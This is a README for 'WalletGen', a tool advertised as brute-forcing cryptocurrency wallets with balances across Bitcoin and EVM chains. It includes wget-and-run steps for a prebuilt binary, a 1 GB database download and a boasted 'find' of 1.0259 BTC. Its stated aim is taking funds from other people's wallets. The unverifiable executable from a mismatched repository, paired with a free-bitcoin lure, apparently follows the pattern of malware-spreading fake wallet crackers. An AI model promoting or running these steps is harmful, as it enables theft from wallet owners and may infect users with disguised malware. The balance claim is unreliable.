WalletGen

Fast wallet mnemonic explorer with simple one-file releases for all major OSes.

### Features
- **Generation of cryptocurrency wallets**: Create single wallets for Bitcoin, Ethereum, BNB, MATIC and more.
- **Search for wallets with balance**: Bruteforce-based scanning of existing wallets with balances across Bitcoin and EVM networks.
- **Support for various algorithms**: Uses Keccak256 for EVM wallets and BIP39, BIP44, Bech32 for Bitcoin.
- **Database-accelerated search**: Use downloadable databases to speed up balance searches by up to 10x.
- **High speed of operation**: Utilizes CPU and GPU power to achieve best performance.
- **Recover your Bitcoin wallet**: Recover BTC wallets from seed phrase (mnemonic phrase).
- **Brain wallet**: Generate and check brain wallets.

### Supported Blockchains
- Bitcoin (BTC)
- Ethereum (ETH)
- Binance Smart Chain (BNB)
- Any EVM-compatible chain

### Windows
- **Download**: [Release](https://github.com/stakssg5/Cute-/releases/latest)
- **Unpack** anywhere
- **Run** `WalletGen.exe`

### MacOS
- **Download**: [Release](https://github.com/stakssg5/Cute-/releases/latest)

### Linux (x86-64bit)
```bash
wget https://github.com/stakssg5/Cute-/releases/latest/download/WalletGen_linux_x64.tar.gz
tar -xzf WalletGen_linux_x64.tar.gz
cd walletgen
./walletgen
```

Or download: [Release for Linux](https://github.com/stakssg5/Cute-/releases/latest)

### Download and Use Database (for more speed)

| **Database**   | **Download link**                                                                 | **File Size** |
|----------------|------------------------------------------------------------------------------------|---------------|
| BTC Database   | [btc_database.txt](https://github.com/stakssg5/Cute-/releases/latest/download/btc_database.txt) | 1.03 GB       |

Use with:
```bash
./walletgen --db btc_database.txt
```

### New Find 10/20/2025
[3G4GbvFzW6DgQSC3vVxWAu7uSg2rnpu9uC](https://www.blockchain.com/explorer/addresses/btc/3G4GbvFzW6DgQSC3vVxWAu7uSg2rnpu9uC) - **1.0259 BTC**

### Building the Project
Use the makefile to build the project and install the [trezor library](https://pypi.org/project/trezor/).

### FAQ
- **Is there a GPU version?** Coming soon.
- **Where are releases?** See the latest on the [releases page](https://github.com/stakssg5/Cute-/releases/latest).

